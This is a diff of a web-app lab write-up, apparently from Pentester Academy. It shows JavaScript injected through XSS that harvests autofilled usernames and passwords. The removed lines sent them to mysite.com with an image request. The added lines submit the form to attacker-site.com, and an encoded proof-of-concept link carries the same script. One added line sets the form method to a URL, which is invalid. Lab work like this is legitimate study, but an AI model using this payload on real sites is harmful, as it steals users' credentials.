@@ -17,15 +17,16 @@ The input tags are not set to autocomplete. So we will do it at first
 ![](https://i.imgur.com/sC7bnlU.png)
 
 ```js
-document.forms[0].autocomplete = "on";
+let form = document.forms[0];
+form.autocomplete = "on";
+form.action = "https://attacker-site.com";
+form.method = "https://attacker-site.com";
 setTimeout(() => {
-  const e = document.querySelector("input[type=text]");
-  const p = document.querySelector("input[type=password]");
-  new Image().src = "https://mysite.com?e=" + e.value + "&p=" + p.value;
+  form.submit();
 }, 10000);
 ```
 
-For POC, [Click Here]()
+For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/12?url=%3Cscript%3Elet%20form%20%3D%20document.forms%5B0%5D%3B%0Aform.autocomplete%20%3D%20%22on%22%3B%0Aform.action%20%3D%20%22https%3A%2F%2Fattacker-site.com%22%3B%0Aform.method%20%3D%20%22https%3A%2F%2Fattacker-site.com%22%3B%0AsetTimeout%28%28%29%20%3D%3E%20%7B%0A%20%20form.submit%28%29%3B%0A%7D%2C%2010000%29%3B%0A%3C%2Fscript%3E)
 
 **More Resources**
 
